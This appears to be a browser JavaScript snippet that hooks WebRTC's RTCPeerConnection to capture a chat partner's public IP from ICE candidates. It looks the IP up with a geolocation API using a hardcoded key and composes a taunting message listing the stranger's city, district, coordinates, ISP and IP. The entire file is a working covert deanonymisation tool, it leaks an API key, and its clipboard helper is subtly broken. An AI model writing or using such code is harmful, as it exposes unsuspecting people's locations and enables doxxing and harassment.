function copyToClipboard(text) {
    var dummy = document.createElement("textarea");
    document.body.appendChild(dummy);
    dummy.value = text;
    dummy.select();
    document.body.removeChild(dummy);
}

window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection;
window.RTCPeerConnection = function(...args){
    const pc = new window.oRTCPeerConnection(...args);
    pc.oaddIceCandidate = pc.addIceCandidate;
    pc.addIceCandidate = function(iceCandidate, ...rest){
        const fields = iceCandidate.candidate.split(" ");
        console.log(iceCandidate.candidate);
        const ip = fields[4];
        if (fields[7]==="srflx"){
            getlocation(ip);
        }
        return pc.oaddIceCandidate(iceCandidate, ...rest);
    };
    return pc;
}

const getlocation = async(ip) =>{
    let url = `https://api.ipgeolocation.io/ipgeo?apiKey=7c0c60b744364ef8ade624986ec98e42&ip=${ip}`;
    await fetch(url).then((response)=>
    response.json().then((json) => {

        const output = `
        .

        You're from ${json.country_name}, ${json.state_prov}, ${json.city}, ${json.district}
        Your longitude and latitude is (${json.latitude} , ${json.longitude})
        And your internet service provider is ${json.isp}
        
        Right?

        Also your ip address is ${json.ip}
        `;
    
    console.log(output);
    copyToClipboard(output);
    
})
);
};
